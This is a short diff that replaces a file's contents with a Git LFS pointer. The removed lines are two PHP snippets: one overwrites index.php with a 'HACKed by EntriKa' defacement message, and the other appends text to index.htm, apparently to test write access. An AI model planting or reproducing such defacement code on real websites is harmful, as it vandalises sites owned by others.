@@ -1,13 +1,3 @@
-<?php
-$entry_line="HACKed by EntriKa";
-$fp = fopen("index.php", "w");
-fputs($fp, $entry_line);
-fclose($fp);
-?>
-
-<? 
-$fp =@fopen("index.htm", "a+");
-$yazi = "test" . "\r\n";
-fwrite ($fp, "$yazi");
-fclose ($fp);
-?>
+version https://git-lfs.github.com/spec/v1
+oid sha256:7d1442740be2c754f23402fa9523ff954f639b9e0803ca9dcee24192f98f307a
+size 213
